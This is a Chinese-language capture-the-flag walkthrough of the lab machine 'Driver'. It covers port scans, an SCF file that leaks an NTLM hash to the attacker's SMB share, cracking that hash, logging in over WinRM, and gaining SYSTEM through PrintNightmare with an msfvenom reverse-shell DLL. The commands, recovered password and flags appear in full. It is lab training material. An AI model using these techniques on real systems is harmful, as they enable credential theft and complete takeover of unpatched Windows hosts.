---
title: Driver
pagination_prev: null
pagination_next: null
---

## 信息收集

### 端口扫描
## 全端口扫描

~~~
┌──(kali㉿kali)-[~/driver]
└─$ sudo nmap -sT -p- --min-rate 2000 10.10.11.106 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 06:24 EST
Nmap scan report for 10.10.11.106
Host is up (0.074s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 65.94 seconds

~~~

## 默认脚本扫描

~~~
┌──(kali㉿kali)-[~/driver]
└─$ sudo nmap -sT -sV -sC -O -p80,135,445,5985 10.10.11.106 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 06:28 EST
Nmap scan report for 10.10.11.106
Host is up (0.080s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h46m36s, deviation: 0s, median: 6h46m36s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-21T18:14:58
|_  start_date: 2024-11-21T18:06:58
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.57 seconds
                                                                          
~~~

## 漏洞脚本扫描

~~~
┌──(kali㉿kali)-[~/driver]
└─$ sudo nmap -sT --script=vuln -p80,135,445,5985 10.10.11.106 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 06:28 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.106
Host is up (0.088s latency).

PORT     STATE SERVICE
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Host script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-061: No accounts left to try
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 433.09 seconds

~~~

## UDP扫描

~~~
┌──(kali㉿kali)-[~/driver]
└─$ sudo nmap -sU --top-ports 20 10.10.11.106 -oA nmap/UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 06:28 EST
Nmap scan report for 10.10.11.106
Host is up (0.071s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds

~~~

## 漏洞利用

### 80 端口 Web 枚举与 SCF 攻擊
默认页是一个登录框
![](Pasted_image_20241121193339.png)

试了一下admin::admin就进去了，看起来像是管理打印机的一个网页

![](Pasted_image_20241121193419.png)

可以上传文件

![](Pasted_image_20241121193519.png)


试了很多种后缀都没什么线索，考虑到这台机器开启了smb服务，上传的文件可能是上传到smb里面的，经过一番查找，scf文件可以再smb中触发，使它连接到我们的smb共享，可能会泄露凭据

编写scf文件

~~~
[Shell]
Command=2
IconFile=\\10.10.16.8\share\something.ico
[Taskbar]
Command=ToggleDesktop
~~~

现在本地架设smb服务

~~~
./impacket-smbserver share .
~~~

上传后，发现本地的smb果然有反应

~~~
┌──(kali㉿kali)-[~/Desktop]
└─$ ./impacket-smbserver share .       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.106,49414)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:107b10039361fefc8f6413f6a435bad8:010100000000000080d1089eca3cdb011be83e6e6ea1d08300000000010010006d0059005100480050004d0053005200030010006d0059005100480050004d0053005200020010006b0059007700730050006e004c005000040010006b0059007700730050006e004c0050000700080080d1089eca3cdb010600040002000000080030003000000000000000000000000020000082c47812cb5d5f8f8788f638531dd9f499eeb8f88848b4e25a39ea09847c36b10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003800000000000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (10.10.11.106,49414)
[*] Remaining connections []

~~~

接下来解密NTLM哈希107b10039361fefc8f6413f6a435bad8

~~~
┌──(kali㉿kali)-[~/driver]
└─$ sudo hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-11400H @ 2.70GHz, 2999/6063 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

TONY::DRIVER:aaaaaaaaaaaaaaaa:107b10039361fefc8f6413f6a435bad8:010100000000000080d1089eca3cdb011be83e6e6ea1d08300000000010010006d0059005100480050004d0053005200030010006d0059005100480050004d0053005200020010006b0059007700730050006e004c005000040010006b0059007700730050006e004c0050000700080080d1089eca3cdb010600040002000000080030003000000000000000000000000020000082c47812cb5d5f8f8788f638531dd9f499eeb8f88848b4e25a39ea09847c36b10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003800000000000000000000000000:liltony
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TONY::DRIVER:aaaaaaaaaaaaaaaa:107b10039361fefc8f641...000000
Time.Started.....: Fri Nov 22 05:58:53 2024 (0 secs)
Time.Estimated...: Fri Nov 22 05:58:53 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   328.2 kH/s (0.97ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 33792/14344385 (0.24%)
Rejected.........: 0/33792 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: !!!!!! -> redlips
Hardware.Mon.#1..: Util: 17%

Started: Fri Nov 22 05:58:26 2024
Stopped: Fri Nov 22 05:58:55 2024

~~~


破解出的密码为`liltony`


试一下拿这组凭据连接smb

~~~
┌──(kali㉿kali)-[~/driver]
└─$ smbclient -L driver.htb -U tony%liltony  -m SMB2

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to driver.htb failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

~~~


靶机还开启了5985端口，开启的是winrm服务，尝试用这组凭据进行连接

~~~
┌──(kali㉿kali)-[~/driver]
└─$ sudo gem install evil-winrm
Fetching nori-2.7.1.gem
Fetching winrm-2.3.9.gem
Successfully installed nori-2.7.1
Successfully installed winrm-2.3.9
Fetching evil-winrm-3.7.gem
Happy hacking! :)
Successfully installed evil-winrm-3.7
Parsing documentation for nori-2.7.1
Installing ri documentation for nori-2.7.1
Parsing documentation for winrm-2.3.9
Installing ri documentation for winrm-2.3.9
Parsing documentation for evil-winrm-3.7
Installing ri documentation for evil-winrm-3.7
Done installing documentation for nori, winrm, evil-winrm after 1 seconds
3 gems installed
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/driver]
└─$ evil-winrm -i 10.10.11.106 -u tony -p liltony
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
*Evil-WinRM* PS C:\Users\tony\Documents> 

~~~

拿到userflag

~~~
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
17c0495384732e2cf20a7bbffb8b7ea1
~~~

## 权限提升

### PrintNightmare (CVE-2021-1675)

查找有没有历史记录文件

~~~
*Evil-WinRM* PS C:\Users\tony\Documents> gci -r c:\ *history*.txt -ea 0 -Force


    Directory: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/28/2021  12:06 PM            134 ConsoleHost_history.txt
*Evil-WinRM* PS C:\Users\tony\Documents> type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1

~~~

查找打印机相关漏洞的的时候查找到有PrintDemon和PrintNightmare
这两个漏洞都与spooler有关

~~~
┌──(kali㉿kali)-[~/driver]
└─$ nxc smb -L | grep print
[*] printerbug                Module to check if the Target is vulnerable to PrinterBug. Set LISTENER IP for coercion.
[*] printnightmare            Check if host vulnerable to printnightmare
[*] spooler                   Detect if print spooler is enabled or not

~~~

nxc也有相关的模块，试一下检测
结果发现是可用利用的

~~~
┌──(kali㉿kali)-[~/driver]
└─$ nxc smb 10.10.11.106 -u tony -p liltony -M printnightmare
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
PRINTNIG... 10.10.11.106    445    DRIVER           Vulnerable, next step https://github.com/ly4k/PrintNightmare

~~~

寻找相关的公开漏洞利用

制作dll文件

~~~
┌──(kali㉿kali)-[~/driver/CVE-2021-1675]                                           └─$ msfvenom -a x64  -p windows/x64/shell_reverse_tcp -f dll LHOST=10.10.16.8 LPORT=233 -o lizi.dll                                                                                                                                                                                  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                                                                                                               
No encoder specified, outputting raw payload                                                                                                                                                                                                                                         
Payload size: 460 bytes                                                                                                                                                                                                                                                              
Final size of dll file: 9216 bytes                                                                                                                                                                                                                                                   
Saved as: lizi.dll                  
~~~

利用evil-winrm的自带功能上传上去

~~~
*Evil-WinRM* PS C:\programdata> upload lizi.dll
                                         
Info: Uploading /home/kali/driver/CVE-2021-1675/lizi.dll to C:\programdata\lizi.dll
                                         
Data: 12288 bytes of 12288 bytes copied
                                         
Info: Upload successful!

~~~

本地运行利用脚本

~~~
┌──(kali㉿kali)-[~/driver/CVE-2021-1675]
└─$ sudo python CVE-2021-1675.py tony:liltony@10.10.11.106  'c:\programdata\lizi.dll'
[*] Connecting to ncacn_np:10.10.11.106[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\UNIDRV.DLL
[*] Executing c:\programdata\lizi.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 543, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1739, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1447, in write
    if ans.isValidAnswer(STATUS_SUCCESS):
       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3structs.py", line 460, in isValidAnswer
    raise smb3.SessionError(self['Status'], self)
impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/kali/driver/CVE-2021-1675/CVE-2021-1675.py", line 192, in <module>
    main(dce, pDriverPath, options.share)
  File "/home/kali/driver/CVE-2021-1675/CVE-2021-1675.py", line 93, in main
    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rprn.py", line 657, in hRpcAddPrinterDriverEx
    return dce.request(request)
           ^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 860, in request
    self.call(request.opnum, request, uuid)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 849, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1302, in send
    self._transport_send(data)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1239, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 543, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 545, in writeFile
    raise SessionError(e.get_error_code(), e.get_error_packet())
impacket.smbconnection.SessionError: SMB SessionError: code: 0xc00000b1 - STATUS_PIPE_CLOSING - The specified named pipe is in the closing state.

~~~

收到回复，提权成功

~~~
┌──(kali㉿kali)-[~/driver]
└─$ sudo rlwrap nc -lvnp 233
[sudo] password for kali: 
listening on [any] 233 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.106] 49417
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

~~~

拿到rootflag
~~~
C:\Users\Administrator\Desktop>type root.txt
type root.txt
8afff2e4307584f32cfdd34d85233072

~~~